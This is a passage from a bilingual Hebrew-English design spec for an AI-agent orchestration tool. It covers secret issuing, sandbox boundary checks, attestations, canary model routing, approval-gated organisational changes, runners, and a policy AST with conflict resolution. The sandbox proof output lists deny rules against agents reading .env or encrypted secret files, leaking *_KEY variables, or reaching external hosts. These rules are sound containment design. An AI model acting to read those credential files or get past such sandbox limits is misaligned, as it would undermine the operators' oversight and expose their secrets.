    agentId: roleId,
    featureSlug,
    taskId,
    context: {
      secretId,
      envVar: secretDef.envVar,
      ttlSeconds: secretDef.ttlSeconds,
      issueId: issue.id
    },
    tags: ['security', 'secret-issued']
  });

  return {
    issueId: issue.id,
    envVar: secretDef.envVar,
    value, // only lives in memory — never persisted outside vault
    expiresAt: issue.expiresAt,
    ttlSeconds: secretDef.ttlSeconds
  };
}

/**
 * Revoke a previously issued secret
 */
export function revokeSecret(root, issueId, reason = 'task_complete') {
  audit.emitAudit(root, {
    type: 'secret_revoked',
    context: { issueId, reason },
    tags: ['security', 'secret-revoked']
  });
}

/**
 * Build secure env for a task, injecting only authorized secrets
 */
export function buildSecureEnv(root, { roleId, taskId, featureSlug, requestedSecrets }) {
  const baseEnv = buildSandboxEnv(root, roleId); // from sandbox.mjs
  const issuedSecrets = [];

  for (const secretId of requestedSecrets || []) {
    try {
      const issued = issueSecret(root, { secretId, roleId, taskId, featureSlug });
      baseEnv[issued.envVar] = issued.value;
      issuedSecrets.push(issued);
    } catch (err) {
      // Access denied — skip, already audited
    }
  }

  return {
    env: baseEnv,
    issuedSecrets,
    cleanup: () => {
      // Revoke all issued secrets on task completion
      for (const secret of issuedSecrets) {
        revokeSecret(root, secret.issueId, 'task_complete');
      }
    }
  };
}
```

**CLI: `ogu sandbox:prove`**

```
Usage: ogu sandbox:prove [--role <id>] [--verbose]

Run internal penetration tests against sandbox boundaries.

Example:
  $ ogu sandbox:prove --role backend-dev
  SANDBOX PROOF for backend-dev (standard policy):

  FILESYSTEM:
    ✓ Cannot read .env                    (blocked by policy)
    ✓ Cannot read .ogu/secrets.enc        (blocked by policy)
    ✓ Cannot write outside ownership scope (src/middleware/ → DENIED)
    ✓ Can read all source files            (readScope: **/*)
    ✓ Can write in scope                   (writeScope: src/api/**)

  NETWORK:
    ✓ Cannot reach external hosts          (outbound: allowlist)
    ✓ Can reach localhost:3000             (allowed)
    ✓ Can reach localhost:5432             (allowed)
    ✗ Cannot verify egress at OS level     (requires container mode)

  ENVIRONMENT:
    ✓ DATABASE_URL available               (granted via SecretBroker)
    ✓ ANTHROPIC_API_KEY stripped           (matches *_KEY pattern)
    ✓ DEPLOY_TOKEN stripped                (not granted to backend-dev)
    ✓ PATH, HOME, SHELL available          (always passed)

  PROCESS:
    ✓ Timeout configured: 300000ms
    ✓ Memory limit: 2048MB
    ✓ Child process limit: 5

  TOOLS:
    ✓ Read allowed
    ✓ Write allowed
    ✓ Bash allowed
    ✗ WebFetch blocked (not in allowlist)

  RESULT: 14/15 PASSED (1 requires container mode for full verification)
```

**כלל ברזל:** `ogu sandbox:prove` must pass before any agent execution. Sandbox הוא חוזה, לא suggestion.

---

### Iteration 2: Provenance & Capability Marketplace (→ 11-12)

---

#### Stone 3: Provenance, Reproducible Builds & Attestations

**הבעיה:** יש snapshots, יש audit — אבל אין דרך לייצר **הוכחה** מי בנה מה, עם אילו inputs, מי אישר, ומה ה-output chain. בלי provenance אי אפשר לעשות compliance, audit חיצוני, או לגלות מתי השתנו דברים.

**קבצים חדשים:**

```
.ogu/attestations/                               ← Attestation store
.ogu/attestations/{featureSlug}.json             ← Per-feature attestation chain
tools/ogu/commands/lib/provenance.mjs            ← Provenance chain builder
tools/ogu/commands/lib/attestation.mjs           ← Attestation signing + verification
tools/ogu/commands/attest.mjs                    ← CLI: attest:create, attest:verify, attest:chain
tools/ogu/commands/replay.mjs                    ← CLI: replay:full, replay:verify, replay:diff
docs/vault/02_Contracts/Provenance.contract.md   ← Provenance system contract
```

**Schema: Attestation**

```json
{
  "$schema": "Attestation/1.0",
  "id": "attest-uuid",
  "featureSlug": "auth-system",
  "attestationType": "build_complete | gate_passed | feature_released | security_reviewed",
  "timestamp": "ISO",

  "subject": {
    "type": "feature | task | artifact | gate",
    "identifier": "auth-system",
    "version": "sha256-of-latest-commit"
  },

  "predicate": {
    "buildInputs": {
      "specHash": "sha256",
      "planHash": "sha256",
      "orgSpecHash": "sha256",
      "policyRulesHash": "sha256",
      "repoCommit": "git-sha"
    },
    "buildOutputs": {
      "artifactHashes": {
        "API:/users POST": "sha256",
        "SCHEMA:users": "sha256"
      },
      "gateResults": {
        "typecheck": "passed",
        "unit_tests": "passed",
        "contracts": "passed"
      },
      "totalCost": 23.45,
      "totalTokens": 890123
    },
    "agents": [
      { "roleId": "backend-dev", "model": "sonnet", "tasks": ["task-1", "task-2"] },
      { "roleId": "security", "model": "opus", "tasks": ["task-7"] }
    ],
    "approvals": [
      { "role": "architect", "decision": "approved", "timestamp": "ISO" }
    ],
    "policySnapshot": "sha256-of-rules.json",
    "sandboxPolicy": "sha256-of-sandbox-policy.json",
    "executionSnapshots": ["sha256-of-task-1.json", "sha256-of-task-2.json"]
  },

  "signature": {
    "method": "hmac-sha256",
    "keyId": "local-signing-key",
    "value": "hex-signature",
    "signedAt": "ISO"
  },

  "chain": {
    "previousAttestationId": "attest-uuid-previous | null",
    "previousAttestationHash": "sha256 | null",
    "sequence": 5
  }
}
```

**CLI Commands:**

```
ogu attest:create <slug> --type build_complete    ← Create attestation for feature
ogu attest:verify <slug>                          ← Verify attestation chain integrity
ogu attest:chain <slug>                           ← Show full attestation history
ogu replay:full <slug> [--container]              ← Replay full build with pinned env
ogu replay:verify <slug>                          ← Compare replay output to original attestation
ogu replay:diff <slug> <attest-1> <attest-2>      ← Diff two builds
```

**Example:**
```
$ ogu attest:chain auth-system
ATTESTATION CHAIN for auth-system:

  #1 │ 2026-02-20 │ build_complete    │ tasks: 1-3   │ $8.50  │ ✓ signed
  #2 │ 2026-02-21 │ gate_passed       │ 14/14 gates  │ —      │ ✓ signed
  #3 │ 2026-02-22 │ security_reviewed │ by: security  │ —      │ ✓ signed
  #4 │ 2026-02-23 │ feature_released  │ v1.0.0       │ $23.45 │ ✓ signed

  CHAIN INTEGRITY: ✓ all hashes link correctly
  TOTAL COST: $23.45
  TOTAL AGENTS: 4 (backend-dev, frontend-dev, qa, security)
  POLICY VERSION: rules.json @ sha256:abc123
```

---

#### Stone 4: Capability Marketplace with Benchmarks & Canary

**הבעיה:** יש capability registry ו-performance index, אבל אין test suite רשמי per capability, אין canary routing (ניסוי מודל חדש על אחוז קטן), ואין deprecation policy.

**קבצים חדשים:**

```
.ogu/capabilities/tests/                         ← Capability test suites
.ogu/capabilities/tests/{capabilityId}.yaml      ← Test suite definition
.ogu/capabilities/canary.json                    ← Active canary experiments
tools/ogu/commands/lib/capability-testing.mjs    ← Test runner + scoring
tools/ogu/commands/lib/canary.mjs                ← Canary routing logic
tools/ogu/commands/capability-test.mjs           ← CLI: capability:test-suite, capability:canary
docs/vault/02_Contracts/CapabilityTestSuite.contract.md
```

**Schema: Capability Test Suite**

```yaml
# .ogu/capabilities/tests/code_generation.yaml
capability: code_generation
version: 1

tests:
  - id: simple-crud-endpoint
    prompt: |
      Create a REST endpoint for a "Product" resource with:
      - GET /products (list with pagination)
      - POST /products (create)
      - GET /products/:id (read)
    expected:
      - type: file_created
        pattern: "**/products/**"
      - type: compiles
      - type: exports_route
        methods: [GET, POST]
    scoring:
      compiles: 30
      correct_methods: 20
      error_handling: 15
      type_safety: 15
      follows_patterns: 20

  - id: complex-auth-middleware
    prompt: |
      Implement JWT authentication middleware that:
      - Validates Bearer tokens
      - Extracts user claims
      - Returns 401 on invalid/expired tokens
    expected:
      - type: file_created
        pattern: "**/middleware/auth*"
      - type: compiles
      - type: handles_error
        status: 401
    scoring:
      compiles: 20
      correct_auth_flow: 30
      error_handling: 20
      security_best_practices: 30

passThreshold: 70
eliteThreshold: 90
```

**Schema: canary.json**

```json
{
  "$schema": "Canary/1.0",
  "experiments": [
    {
      "id": "canary-gpt4o-codegen",
      "status": "active",
      "startedAt": "ISO",
      "capability": "code_generation",
      "control": {
        "provider": "anthropic",
        "model": "claude-sonnet-4-6"
      },
      "treatment": {
        "provider": "openai",
        "model": "gpt-4o"
      },
      "trafficPercent": 10,
      "minSample": 20,
      "maxSample": 100,
      "successThreshold": 0.85,
      "metrics": {
        "control": { "tasks": 45, "successRate": 0.91, "avgCost": 0.35 },
        "treatment": { "tasks": 5, "successRate": 0.80, "avgCost": 0.28 }
      },
      "decision": null,
      "decisionAt": null
    }
  ],
  "graduationPolicy": {
    "minSample": 20,
    "requiredSuccessRate": 0.85,
    "maxCostIncrease": 1.2,
    "autoGraduate": false,
    "requireApproval": "tech-lead"
  }
}
```

**CLI Commands:**

```
ogu capability:test-suite <capabilityId> --model <model>     ← Run test suite
ogu capability:canary start --capability <id> --treatment <provider/model> --traffic 10
ogu capability:canary status                                  ← Show active experiments
ogu capability:canary graduate <experiment-id>                ← Promote treatment to default
ogu capability:canary abort <experiment-id>                   ← Stop experiment
ogu capability:deprecate <provider/model> [--replacement <provider/model>]
```

---

### Iteration 3: Org Evolution + Distributed Ready (→ 13/10)

---

#### Stone 5: Org Evolution (Self-Modifying Organization)

**הבעיה:** Learning loop יש, אבל הלמידה לא מייצרת שינויים מבניים. חברה אמיתית מתפתחת — תפקידים משתנים, מדיניות מתעדכנת, צוותים מתארגנים מחדש. בלי מנגנון evolution מבוקר, שינויים יהיו ad-hoc ולא ניתנים לביקורת.

**קבצים חדשים:**

```
.ogu/proposals/                                  ← Change proposals
.ogu/proposals/{id}.json                         ← Individual proposal
tools/ogu/commands/lib/org-evolution.mjs         ← Proposal generation + application
tools/ogu/commands/proposal.mjs                  ← CLI: proposal:create, proposal:apply, proposal:rollback, proposal:history
docs/vault/02_Contracts/OrgEvolution.contract.md ← Evolution governance contract
```

**Schema: Change Proposal**

```json
{
  "$schema": "ChangeProposal/1.0",
  "id": "prop-uuid",
  "createdAt": "ISO",
  "source": "performance_index | human | policy_engine | learning_signal",
  "sourceSignalId": "signal-id or null",
  "status": "proposed | approved | applied | rolled_back | rejected",

  "changes": [
    {
      "type": "update_capability_tier",
      "target": "capabilities.json",
      "path": "capabilities[id=security_audit].minTier",
      "before": 2,
      "after": 3,
      "rationale": "sonnet fails security_audit 35% — tier 3 models have required security_knowledge trait"
    },
    {
      "type": "update_policy_rule",
      "target": "policy/rules.json",
      "path": "rules[id=tier3-only-after-failures]",
      "before": { "field": "task.failureCount", "op": "lt", "value": 2 },
      "after": { "field": "task.failureCount", "op": "lt", "value": 1 },
      "rationale": "Performance data shows first failure at tier 2 wastes tokens — escalate sooner"
    }
  ],

  "impact": {
    "affectedRoles": ["security"],
    "estimatedCostDelta": "+$5.00/day",
    "estimatedSuccessDelta": "+15% for security_audit tasks",
    "riskLevel": "low"
  },

  "approval": {
    "requiredRole": "tech-lead",
    "approvedBy": null,
    "approvedAt": null,
    "comment": null
  },

  "rollback": {
    "available": true,
    "rollbackId": null,
    "affectedFeatures": [],
    "affectedExecutions": []
  }
}
```

**CLI Commands:**

```
ogu proposal:create --from-signals            ← Generate proposals from learning signals
ogu proposal:list [--status proposed|applied]  ← List proposals
ogu proposal:show <id>                         ← Show proposal details
ogu proposal:apply <id>                        ← Apply proposal (requires approval)
ogu proposal:rollback <id>                     ← Rollback applied proposal
ogu proposal:history                           ← Full evolution history
```

**Example:**
```
$ ogu proposal:create --from-signals
Generated 3 proposals from performance data:

  PROP-001 │ Update security_audit minTier 2→3
           │ Source: model_capability_mismatch signal (confidence: 85%)
           │ Impact: +$5/day, +15% success for security tasks
           │ Risk: low │ Requires: tech-lead approval

  PROP-002 │ Downgrade static_analysis default to haiku
           │ Source: cost_efficiency_opportunity signal (confidence: 90%)
           │ Impact: -$3/day, maintains 95% success
           │ Risk: low │ Auto-applicable

  PROP-003 │ Add policy rule: "escalate sooner for backend-dev on auth tasks"
           │ Source: role_domain_weakness signal (confidence: 72%)
           │ Impact: +$2/day, +25% success for auth middleware
           │ Risk: medium │ Requires: tech-lead approval

$ ogu proposal:apply PROP-002
✓ Proposal PROP-002 applied (auto-applicable, low risk)
  Changed: capabilities.json → static_analysis.preferredTier = 1
  Rollback available: ogu proposal:rollback PROP-002
```

**כלל ברזל:** שום שינוי מבני (OrgSpec, capabilities, policies) לא קורה "ביד". הכל עובר דרך proposal → approval → apply → audit. Rollback תמיד זמין.

---

#### Stone 6: Distributed Ready (Runner Abstraction)

**הבעיה:** הכל רץ local. כשתרצה להריץ על שרת, על cloud, או על מכונות מרובות — אין abstraction layer. Runner, storage, ו-scheduling קשורים ל-local filesystem.

**קבצים חדשים:**

```
tools/ogu/commands/lib/runner.mjs                ← Runner abstraction interface
tools/ogu/commands/lib/runner-local.mjs          ← Local runner implementation
tools/ogu/commands/lib/runner-remote.mjs         ← Remote runner (HTTP/SSH)
tools/ogu/commands/lib/job-queue.mjs             ← Deterministic job scheduling
tools/ogu/commands/lib/storage-adapter.mjs       ← Pluggable storage interface
tools/ogu/commands/runner.mjs                    ← CLI: runner:local, runner:remote, runner:status
docs/vault/02_Contracts/Runner.contract.md       ← Runner interface contract
```

**Schema: Runner.contract.md**

```json
{
  "$schema": "RunnerContract/1.0",

  "interface": {
    "methods": [
      {
        "name": "executeTask",
        "input": "InputEnvelope (from Kadima↔Ogu contract)",
        "output": "OutputEnvelope | ErrorEnvelope",
        "guarantees": [
          "Execution is isolated (sandbox policy enforced)",
          "All tool calls are audited",
          "Execution snapshot is captured",
          "Budget is tracked",
          "Timeout is enforced"
        ]
      },
      {
        "name": "getStatus",
        "output": "{ running: Task[], queued: Task[], completed: Task[] }"
      },
      {
        "name": "cancelTask",
        "input": "{ taskId: string }",
        "output": "{ cancelled: boolean, cleanup: string }"
      }
    ],
    "events": [
      "task:started",
      "task:progress",
      "task:completed",
      "task:failed",
      "resource:exhausted"
    ]
  },

  "implementations": {
    "local": {
      "description": "Runs on developer machine via Claude CLI subprocess",
      "storage": "filesystem (.ogu/)",
      "concurrency": "limited by resource-governor",
      "isolation": "git worktree + sandbox policy"
    },
    "remote": {
      "description": "Runs on remote server via HTTP API or SSH",
      "storage": "remote filesystem or object store",
      "concurrency": "limited by server capacity + resource-governor",
      "isolation": "container per task"
    }
  },

  "contract": {
    "sameInput_sameOutput": "Given identical InputEnvelope and model version, both runners produce functionally equivalent OutputEnvelope",
    "auditEquivalence": "Audit trail from local and remote must have identical structure",
    "snapshotCompatibility": "Execution snapshots from both runners must be cross-verifiable"
  }
}
```

**Pseudo-code: runner.mjs (interface)**

```javascript
// tools/ogu/commands/lib/runner.mjs

/**
 * Runner interface — all implementations must satisfy this contract
 */
export class Runner {
  /**
   * Execute a task from Kadima InputEnvelope
   * @param {InputEnvelope} envelope
   * @returns {Promise<OutputEnvelope | ErrorEnvelope>}
   */
  async executeTask(envelope) { throw new Error('Not implemented'); }

  /** Get current runner status */
  async getStatus() { throw new Error('Not implemented'); }

  /** Cancel a running task */
  async cancelTask(taskId) { throw new Error('Not implemented'); }

  /** Health check */
  async healthCheck() { throw new Error('Not implemented'); }
}

/**
 * Create runner based on configuration
 */
export function createRunner(config) {
  switch (config.type) {
    case 'local':
      return new LocalRunner(config);
    case 'remote':
      return new RemoteRunner(config);
    default:
      throw new Error(`OGU3501: Unknown runner type: ${config.type}`);
  }
}
```

**Pseudo-code: storage-adapter.mjs (interface)**

```javascript
// tools/ogu/commands/lib/storage-adapter.mjs

/**
 * Storage adapter interface — pluggable backend
 * Default: local filesystem
 * Future: SQLite, Postgres, S3, etc.
 */
export class StorageAdapter {
  async read(path) { throw new Error('Not implemented'); }
  async write(path, data) { throw new Error('Not implemented'); }
  async exists(path) { throw new Error('Not implemented'); }
  async list(prefix) { throw new Error('Not implemented'); }
  async delete(path) { throw new Error('Not implemented'); }
  async atomicWrite(path, data) { throw new Error('Not implemented'); }
}

export class LocalFileStorage extends StorageAdapter {
  constructor(rootDir) { super(); this.root = rootDir; }

  async read(path) {
    return readFileSync(join(this.root, path), 'utf-8');
  }
  async write(path, data) {
    mkdirSync(dirname(join(this.root, path)), { recursive: true });
    writeFileSync(join(this.root, path), data);
  }
  // ... etc
}

// Future: export class PostgresStorage extends StorageAdapter { ... }
// Future: export class S3Storage extends StorageAdapter { ... }
```

**CLI Commands:**

```
ogu runner:local                           ← Start local runner (default)
ogu runner:remote --host <url>             ← Connect to remote runner
ogu runner:status                          ← Show runner health and queue
ogu runner:verify                          ← Run same task on local + remote, compare outputs
```

**כלל ברזל:** Runner contract = InputEnvelope → OutputEnvelope. שום runner-specific logic לא נזלג ל-Kadima/Ogu. Local ו-remote מייצרים תוצאות זהות.

---

## Iteration 4: Formal Hardening — ל-13 אמיתי

> ארבע פורמליזציות קשיחות ושלוש הרחבות שסוגרות את הפער בין "ארכיטקטורה רצינית" ל-"OS תשתיתי".
> כל closure היא מנגנון מקודד, לא הצהרה. כל enhancement מוסיפה יכולת שלא קיימת.

```
Closure 1: Policy AST + Deterministic Evaluation Pipeline
Closure 2: Feature Lifecycle — Full Formal State Machine
Closure 3: Feature Isolation Model
Closure 4: Agent Identity Contract

Enhancement 1: KadimaAdapter.contract — strict boundary enforcement
Enhancement 2: Company Snapshot — full org replay
Enhancement 3: Failure Simulation Mode — chaos injection
```

---

### Closure 1: Policy AST & Deterministic Evaluation Pipeline

**הבעיה:** Stone 1 הגדיר Declarative Policy Engine עם rule schema ו-`evaluate()`, אבל חסרים 4 דברים פורמליים:
1. **Policy AST** — אין הגדרה פורמלית של עץ ה-syntax. Rules הם JSON blobs, לא AST שניתן לסדר, לנתח ולהשוות.
2. **Evaluation order** — `sort by priority` לא מספיק. מה קורה כששני חוקים באותו priority סותרים?
3. **Conflict resolution** — אין אסטרטגיה כתובה ומקודדת לפתרון התנגשויות.
4. **Policy versioning** — ה-hash נכנס ל-snapshot, אבל אין version chain שמוכיח ש-policy לא השתנה תוך כדי execution.

**קבצים חדשים:**

```
.ogu/policy/policy.ast.json                     ← Compiled AST (generated from rules.json)
.ogu/policy/policy-version.json                 ← Version chain with hash history
tools/ogu/commands/lib/policy-ast.mjs           ← AST compiler + optimizer + serializer
tools/ogu/commands/lib/policy-resolver.mjs      ← Conflict resolution engine
docs/vault/02_Contracts/PolicyDeterminism.contract.md ← Formal determinism contract
```

**Schema: Policy AST Node**

```json
{
  "$schema": "PolicyAST/1.0",
  "description": "Every rule compiles to a tree of typed AST nodes. The evaluator walks this tree — never the raw JSON.",

  "ASTNode": {
    "type": "enum: RuleNode | ConditionNode | LogicalNode | EffectNode | LeafNode",

    "RuleNode": {
      "id": "string — rule id",
      "priority": "number — normalized to 0-1000",
      "group": "string — conflict resolution group (e.g. 'approval', 'model_tier', 'concurrency')",
      "when": "LogicalNode",
      "unless": "LogicalNode | null",
      "effects": ["EffectNode"],
      "version": "number",
      "hash": "SHA256 of canonical JSON representation"
    },

    "LogicalNode": {
      "operator": "AND | OR | NOT",
      "children": ["LogicalNode | LeafNode"],
      "shortCircuit": "boolean — true = stop on first decisive result"
    },

    "LeafNode": {
      "field": "string — dotted path (e.g. 'task.riskTier')",
      "op": "string — comparison operator",
      "value": "any — expected value",
      "fieldType": "string | number | boolean | string[] — inferred from schema",
      "hash": "SHA256 of field+op+value canonical form"
    },

    "EffectNode": {
      "effect": "string — effect type",
      "params": "object",
      "group": "string — which conflict group this effect belongs to",
      "merge": "enum: max | min | union | replace | append — how to merge with same-group effects"
    }
  }
}
```

**Schema: Policy Version Chain**

```json
{
  "$schema": "PolicyVersionChain/1.0",
  "current": {
    "version": 7,
    "rulesHash": "sha256:abc123...",
    "astHash": "sha256:def456...",
    "compiledAt": "ISO timestamp",
    "ruleCount": 12,
    "effectGroups": ["approval", "model_tier", "concurrency", "sandbox", "audit"]
  },
  "history": [
    {
      "version": 6,
      "rulesHash": "sha256:prev...",
      "astHash": "sha256:prevast...",
      "compiledAt": "ISO timestamp",
      "changedRules": ["added:new-rule-id", "modified:existing-rule-id"],
      "author": "cto"
    }
  ],
  "lockContract": {
    "description": "Policy version MUST NOT change during a feature execution. If it does, all in-flight tasks must re-evaluate.",
    "enforcedBy": "execution-snapshot.mjs checks policyVersion at start and end of each task"
  }
}
```

**Pseudo-code: policy-ast.mjs — AST Compiler**

```javascript
// tools/ogu/commands/lib/policy-ast.mjs

import { createHash } from 'crypto';

/**
 * Compile raw rules.json → typed AST
 * Every rule becomes a RuleNode with typed children.
 * The AST is the ONLY thing the evaluator reads.
 */
export function compileToAST(rulesConfig) {
  const ast = {
    $schema: 'PolicyAST/1.0',
    compiledAt: new Date().toISOString(),
    rules: [],
    effectGroups: new Map(),
    rulesHash: hashCanonical(rulesConfig.rules)
  };

  for (const rule of rulesConfig.rules) {
    if (rule.enabled === false) continue;

    const ruleNode = {
      type: 'RuleNode',
      id: rule.id,
      priority: normalizePriority(rule.priority),
      group: inferConflictGroup(rule.then),
      when: compileCondition(rule.when),
      unless: rule.unless ? compileCondition(rule.unless) : null,
      effects: rule.then.map(e => compileEffect(e, rulesConfig.effects)),
      version: rule.version || 1,
      hash: hashCanonical(rule)
    };

    ast.rules.push(ruleNode);
  }

  // Sort: primary by priority DESC, secondary by id ASC (deterministic tiebreak)
  ast.rules.sort((a, b) => {
    if (b.priority !== a.priority) return b.priority - a.priority;
    return a.id.localeCompare(b.id); // DETERMINISTIC TIEBREAK
  });

  ast.astHash = hashCanonical(ast.rules);
  return ast;
}

/**
 * Normalize priority to 0-1000 range
 * Raw priorities: 1-100 → Normalized: 0-1000
 */
function normalizePriority(raw) {
  return Math.round((raw || 50) * 10);
}

/**
 * Compile a condition block → LogicalNode tree
 */
function compileCondition(condition) {
  if (condition.operator) {
    return {
      type: 'LogicalNode',
      operator: condition.operator,
      children: condition.conditions.map(c => compileCondition(c)),
      shortCircuit: condition.operator === 'AND' // AND short-circuits on first false
    };
  }

  // Leaf condition
  return {
    type: 'LeafNode',
    field: condition.field,
    op: condition.op,
    value: condition.value,
    fieldType: inferFieldType(condition.value),
    hash: hashCanonical({ field: condition.field, op: condition.op, value: condition.value })
  };
}

/**
 * Compile an effect → EffectNode with merge strategy
 */
function compileEffect(effect, effectDefs) {
  const def = effectDefs[effect.effect];
  return {
    type: 'EffectNode',
    effect: effect.effect,
    params: effect.params,
    group: EFFECT_GROUP_MAP[effect.effect],
    merge: EFFECT_MERGE_MAP[effect.effect]
  };
}

/**
 * Effect → Conflict Group mapping
 * Effects in the same group can conflict and need resolution
 */
const EFFECT_GROUP_MAP = {
  requireApprovals:    'approval',
  autoApprove:         'approval',
  blockExecution:      'execution',
  setMinModelTier:     'model_tier',
  downgradeModelTier:  'model_tier',
  addGates:            'gates',
  addReviewers:        'approval',
  throttleConcurrency: 'concurrency',
  forceSandbox:        'sandbox',
  emitAlert:           'notification',
  tagForAudit:         'audit'
};

/**
 * Effect → Merge strategy when multiple rules fire same group
 */
const EFFECT_MERGE_MAP = {
  requireApprovals:    'max',     // highest approval count wins
  autoApprove:         'replace', // last one wins, but explicit approval always overrides
  blockExecution:      'replace', // any block = blocked
  setMinModelTier:     'max',     // highest tier wins
  downgradeModelTier:  'min',     // lowest cap wins (most restrictive)
  addGates:            'union',   // all gates combined
  addReviewers:        'union',   // all reviewers combined
  throttleConcurrency: 'min',     // most restrictive limit wins
  forceSandbox:        'max',     // strictest sandbox wins
  emitAlert:           'append',  // all alerts emitted
  tagForAudit:         'union'    // all tags combined
};

function hashCanonical(obj) {
  // Canonical: sorted keys, no whitespace — guarantees same input = same hash
  const canonical = JSON.stringify(obj, Object.keys(obj).sort());
  return 'sha256:' + createHash('sha256').update(canonical).digest('hex').slice(0, 16);
}

function inferFieldType(value) {
  if (Array.isArray(value)) return 'string[]';
  return typeof value;
}
```

**Pseudo-code: policy-resolver.mjs — Conflict Resolution Engine**

```javascript
// tools/ogu/commands/lib/policy-resolver.mjs

/**
 * Resolve conflicts between effects from multiple matching rules.
 *
 * Strategy (formal and deterministic):
 * 1. Group effects by conflict group
 * 2. Within each group, apply merge strategy
 * 3. Explicit > implicit (requireApprovals kills autoApprove)
 * 4. Restrictive > permissive (block beats allow)
 * 5. All decisions logged for audit trace
 */
export function resolveConflicts(matchedRules) {
  const groups = new Map(); // group → [{ ruleId, priority, effect }]
  const resolutionLog = [];

  // Step 1: Group all effects
  for (const rule of matchedRules) {
    for (const effect of rule.effects) {
      const group = effect.group;
      if (!groups.has(group)) groups.set(group, []);
      groups.get(group).push({
        ruleId: rule.id,
        priority: rule.priority,
        effect
      });
    }
  }

  // Step 2: Resolve each group
  const resolved = {};

  for (const [group, entries] of groups) {
    // Sort by priority DESC, then ruleId ASC (deterministic)
    entries.sort((a, b) => {
      if (b.priority !== a.priority) return b.priority - a.priority;
      return a.ruleId.localeCompare(b.ruleId);
    });

    const mergeStrategy = entries[0].effect.merge;
    const result = applyMerge(mergeStrategy, entries);

    resolved[group] = result.value;
    resolutionLog.push({
      group,
      strategy: mergeStrategy,
      candidates: entries.map(e => ({ rule: e.ruleId, priority: e.priority })),
      winner: result.winner,
      conflicts: result.conflicts
    });
  }

  return { resolved, resolutionLog };
}

/**
 * Apply merge strategy to a set of effects in the same group
 */
function applyMerge(strategy, entries) {
  switch (strategy) {
    case 'max':
      // Highest numeric value wins (e.g. most approvals, highest tier)
      return pickMax(entries);

    case 'min':
      // Lowest value wins (e.g. most restrictive cap)
      return pickMin(entries);

    case 'union':
      // Combine all values (e.g. all gates, all tags, all reviewers)
      return mergeUnion(entries);

    case 'replace':
      // Highest priority wins; if same priority, most restrictive wins
      return pickHighestPriority(entries);

    case 'append':
      // All effects emit (e.g. all alerts)
      return appendAll(entries);

    default:
      return pickHighestPriority(entries);
  }
}

function pickMax(entries) {
  const numericValue = (e) => {
    const p = e.effect.params;
    return p.count || p.tier || p.maxParallel || 0;
  };

  let max = entries[0];
  const conflicts = [];

  for (let i = 1; i < entries.length; i++) {
    if (numericValue(entries[i]) > numericValue(max)) {
      conflicts.push({ loser: max.ruleId, winner: entries[i].ruleId, reason: 'lower value' });
      max = entries[i];
    } else if (numericValue(entries[i]) === numericValue(max)) {
      conflicts.push({ tied: [max.ruleId, entries[i].ruleId], resolved: 'priority tiebreak' });
    }
  }

  return { value: max.effect, winner: max.ruleId, conflicts };
}

function pickMin(entries) {
  const numericValue = (e) => {
    const p = e.effect.params;
    return p.tier || p.maxParallel || Infinity;
  };

  let min = entries[0];
  const conflicts = [];

  for (let i = 1; i < entries.length; i++) {
    if (numericValue(entries[i]) < numericValue(min)) {
      conflicts.push({ loser: min.ruleId, winner: entries[i].ruleId, reason: 'higher value (less restrictive)' });
      min = entries[i];
    }
  }

  return { value: min.effect, winner: min.ruleId, conflicts };
}

function mergeUnion(entries) {
  const combined = new Set();
  for (const e of entries) {
    for (const val of Object.values(e.effect.params).flat()) {
      combined.add(val);
    }
  }
  return { value: [...combined], winner: 'merged', conflicts: [] };
}

function pickHighestPriority(entries) {
  // Already sorted by priority DESC
  return {
    value: entries[0].effect,
    winner: entries[0].ruleId,
    conflicts: entries.length > 1
      ? [{ overridden: entries.slice(1).map(e => e.ruleId), by: entries[0].ruleId }]
      : []
  };
}

function appendAll(entries) {
  return {
    value: entries.map(e => e.effect),
    winner: 'all',
    conflicts: []
  };
}
```

**Strict Evaluation Pipeline (replaces loose `evaluate()` from Stone 1):**

```javascript
// Updated evaluate() — deterministic pipeline

export function evaluate(root, context) {
  // Step 1: Load AST (NOT raw rules)
  const ast = loadCompiledAST(root);
  if (!ast) throw new Error('OGU3601: No compiled AST. Run ogu policy:compile first.');

  // Step 2: Verify AST freshness
  const currentRulesHash = hashFile(join(root, '.ogu/policy/rules.json'));
  if (currentRulesHash !== ast.rulesHash) {
    throw new Error('OGU3602: AST stale — rules.json changed since last compile. Run ogu policy:compile.');
  }

  // Step 3: Walk AST — evaluation order is AST order (pre-sorted, deterministic)
  const matched = [];
  for (const ruleNode of ast.rules) {
    const whenResult = walkCondition(ruleNode.when, context);
    const unlessResult = ruleNode.unless ? walkCondition(ruleNode.unless, context) : false;

    if (whenResult && !unlessResult) {
      matched.push(ruleNode);
    }
  }

  // Step 4: Resolve conflicts (deterministic resolver)
  const { resolved, resolutionLog } = resolveConflicts(matched);

  // Step 5: Apply hardcoded invariants (these ALWAYS win)
  applyInvariants(resolved);

  // Step 6: Build evaluation receipt
  return {
    effects: resolved,
    matchedRules: matched.map(r => r.id),
    resolutionLog,
    astVersion: ast.compiledAt,
    astHash: ast.astHash,
    policyVersion: loadPolicyVersion(root).current.version,
    evaluatedAt: new Date().toISOString(),
    deterministic: true
  };
}

/**
 * Hardcoded invariants that no rule can override
 */
function applyInvariants(resolved) {
  // INVARIANT 1: explicit approval always beats autoApprove
  if (resolved.approval?.effect === 'requireApprovals') {
    delete resolved.autoApproved;
  }

  // INVARIANT 2: blockExecution is absolute — nothing can unblock except override
  if (resolved.execution?.effect === 'blockExecution') {
    resolved._blocked = true;
  }

  // INVARIANT 3: model tier cannot exceed org max
  if (resolved.model_tier?.params?.tier > 3) {
    resolved.model_tier.params.tier = 3;
  }
}
```

**Integration: Policy Hash in Execution Snapshot (strengthened)**

```javascript
// In execution-snapshot.mjs — formal policy binding

function capturePolicyBinding(root, context) {
  const policyVersion = loadPolicyVersion(root);
  const evaluation = evaluate(root, context);

  return {
    // Immutable binding — if any of these change, snapshot is invalid
    policyVersionAtStart: policyVersion.current.version,
    rulesHashAtStart: policyVersion.current.rulesHash,
    astHashAtStart: policyVersion.current.astHash,
    evaluationResult: evaluation,
    evaluationHash: hashCanonical(evaluation),

    // Verification: at task END, re-check these values
    verify: (root) => {
      const currentVersion = loadPolicyVersion(root);
      if (currentVersion.current.version !== policyVersion.current.version) {
        return {
          valid: false,
          error: 'OGU3603: Policy version changed during execution',
          before: policyVersion.current.version,
          after: currentVersion.current.version
        };
      }
      return { valid: true };
    }
  };
}
```

**CLI Commands:**

```
ogu policy:compile                             ← Compile rules.json → AST + version bump
ogu policy:compile --verify                    ← Compile + verify AST matches rules
ogu policy:ast                                 ← Show compiled AST tree (human-readable)
